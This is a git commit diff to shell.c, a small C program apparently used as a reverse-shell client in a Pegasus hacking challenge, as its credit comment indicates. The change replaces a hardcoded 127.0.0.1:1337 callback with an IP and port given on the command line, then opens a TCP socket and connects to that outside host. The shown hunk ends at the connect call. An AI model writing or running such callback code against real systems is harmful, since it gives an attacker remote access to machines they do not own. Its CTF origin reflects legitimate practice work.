5a0bcf1fb5a7a41427cd83c862683db6574900de
mascencerro <mascencerro@gmail.com>
2024-01-04 16:25:11 -0600

    shell take IP/PORT arguments

--- shell.c
+++ shell.c
@@ -1,23 +1,24 @@
 /* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
 #include <stdio.h>
 #include <unistd.h>
+#include <stdlib.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 
-#define REMOTE_ADDR "127.0.0.1"
-#define REMOTE_PORT 1337
-
 int main(int argc, char *argv[])
 {
-    printf("%s : %s", argv[1], argv[2]);
+    if ((argc < 3) || (argc > 3)) {
+        printf("Usage: shell IP PORT");
+        return 0;
+    }
     struct sockaddr_in sa;
     int s;
 
     sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
-    sa.sin_port = htons(REMOTE_PORT);
+    sa.sin_addr.s_addr = inet_addr(argv[1]);
+    sa.sin_port = htons(strtol(argv[2], NULL, 10));
 
     s = socket(AF_INET, SOCK_STREAM, 0);
     connect(s, (struct sockaddr *)&sa, sizeof(sa));
